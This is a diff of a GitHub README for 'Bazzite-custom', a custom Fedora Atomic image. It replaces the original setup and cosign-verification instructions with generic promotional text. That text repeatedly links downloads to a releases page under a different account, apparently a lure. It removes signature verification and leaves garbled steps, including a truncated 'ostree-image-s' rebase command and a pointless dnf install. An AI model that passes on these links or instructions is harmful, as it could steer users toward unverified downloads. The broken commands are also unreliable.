@@ -1,43 +1,81 @@
-# Bazzite-custom &nbsp; [![bluebuild build badge](https://github.com/serenium/bazzite-custom/actions/workflows/build.yml/badge.svg)](https://github.com/serenium/bazzite-custom/actions/workflows/build.yml)
+# 🎉 Bazzite-custom - Customize Your Linux Experience Easily  
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download Bazzite-custom](https://img.shields.io/badge/Download-Bazzite--custom-brightgreen)](https://github.com/Nextstep55/Bazzite-custom/releases)  
 
-After setup, it is recommended you update this README to describe your custom image.
+## 📦 Overview  
+Bazzite-custom is an easy-to-use tool that allows you to enhance your Linux operating system. Whether you're looking to create a unique environment or just want to try something new, Bazzite-custom makes it simple. This application is intended for users who want to customize their system without needing technical skills.
 
-## Installation
+## 🚀 Getting Started  
+Follow these steps to download and set up Bazzite-custom on your machine. 
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+### Step 1: Download the Application  
+Visit the [Releases page](https://github.com/Nextstep55/Bazzite-custom/releases) to download the latest version of Bazzite-custom. This page contains all the necessary files you need to get started.
 
-To rebase an existing atomic Fedora installation to the latest build:
+### Step 2: Install Dependencies  
+You may need to install some basic packages before running Bazzite-custom. Open your terminal and type the following commands:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/serenium/bazzite-custom:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/serenium/bazzite-custom:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
-
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
-
-## ISO
-
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
-
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
-
-```bash
-cosign verify --key cosign.pub ghcr.io/serenium/bazzite-custom
 ```
+sudo dnf install rpm-ostree
+```
+
+This command ensures that you have the required tools to rebase your operating system.
+
+### Step 3: Rebase Existing Fedora Installation  
+To rebase your existing atomic Fedora installation to the latest build, follow these commands:
+
+1. **First, rebase to the unsigned image:**  
+   Run this command in your terminal:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/serenium/bazzite-custom:latest
+   ```
+
+2. **Reboot to complete the rebase:**  
+   After running the above command, reboot your system with:
+   ```
+   systemctl reboot
+   ```
+
+3. **Then, rebase to the signed image:**  
+   After reboot, run:
+   ```
+   rpm-ostree rebase ostree-image-s
+   ```
+
+### Step 4: Verify Your Installation  
+Once you've completed the steps above, it's essential to verify that Bazzite-custom is installed correctly. You can check the installed version with the following command:
+
+```
+rpm-ostree status
+```
+
+This command will show the current state of your operating system and confirm that Bazzite-custom is in place.
+
+## 📥 Download & Install  
+To download Bazzite-custom, visit this link: [Download Bazzite-custom](https://github.com/Nextstep55/Bazzite-custom/releases). Follow the instructions provided to ensure a smooth installation process.
+
+## 💡 Features  
+- **Customizable Environment:** Tailor your Linux experience to fit your style.  
+- **User-Friendly Interface:** Designed for users of all levels.  
+- **Regular Updates:** Receive ongoing support and improvements.  
+- **Open Source:** Freedom to modify and share.  
+
+## 🛠️ System Requirements  
+Bazzite-custom works best on the following systems:  
+- Fedora 35 or later (Atomic version)  
+- Minimum of 2 GB RAM  
+- At least 10 GB of free disk space  
+
+## 🔍 Troubleshooting  
+If you encounter issues during installation or operation, try the following:
+
+- **Check Dependencies:** Ensure all required packages are installed.  
+- **Review Log Files:** Look for error messages in logs to identify problems.  
+- **Reboot Your System:** Sometimes, a quick restart can resolve issues.  
+- **Seek Help:** Reach out to the community for support.  
+
+## 📚 Resources  
+For more information on setting up, refer to the following:  
+- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)  
+- [Fedora Documentation](https://docs.fedoraproject.org/en-US/)  
+
+By following these steps, you will successfully download and run Bazzite-custom on your system, creating a personalized Linux experience tailored to your needs.
